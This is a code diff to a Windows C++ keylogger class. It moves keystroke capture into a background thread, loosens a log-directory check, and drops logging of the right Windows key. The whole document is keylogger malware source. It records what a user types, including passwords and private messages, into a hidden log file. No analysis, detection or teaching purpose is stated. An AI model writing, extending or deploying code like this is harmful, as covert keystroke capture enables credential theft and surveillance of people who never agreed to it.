@@ -5,6 +5,7 @@
 #include <windows.h>
 #include <fstream>
 #include <filesystem>
+#include <thread>
 
 namespace fs = std::filesystem;
 
@@ -22,7 +23,6 @@ KeyLogger::KeyLogger()
 KeyLogger::KeyLogger(KeyLogger& keyLogger)
 {
 	SetDirectory(keyLogger.directory.c_str());
-	CreateLogFile();
 }
 
 KeyLogger::KeyLogger(const char* directory)
@@ -34,7 +34,7 @@ int KeyLogger::SetDirectory(const char* directory) {
 	struct stat st;
 	if (stat(directory, &st) == 0) {
 		this->directory = directory + FILE_NAME;
-		if (CreateLogFile() == 0) {
+		if (CreateLogFile() == 0 || stat(directory, &st) == 0) {
 			return STATUS_CODES(Success);
 		}
 	}
@@ -65,7 +65,8 @@ void KeyLogger::SetDefaultDirectory()
 	CreateLogFile();
 }
 
-void KeyLogger::StartKeyLogger() {
+void KeyLogger::StartKeyLoggerThread()
+{
 	std::fstream log;
 	loggerState = TRUE;
 	char c;
@@ -79,9 +80,6 @@ void KeyLogger::StartKeyLogger() {
 					{
 					case VK_LWIN:
 						log << "{leftWindows}";
-						break;
-					case VK_RWIN:
-						log << "{RightWindows}";
 						break;
 					case VK_BACK:
 						log << "{backspace}";
@@ -112,6 +110,12 @@ void KeyLogger::StartKeyLogger() {
 			}
 		}
 	}
+}
+
+std::thread KeyLogger::StartKeyLogger()
+{
+	std::thread thread_ScreenCapture(&KeyLogger::StartKeyLoggerThread, this);
+	return thread_ScreenCapture;
 }
 
 void KeyLogger::StopLogging()
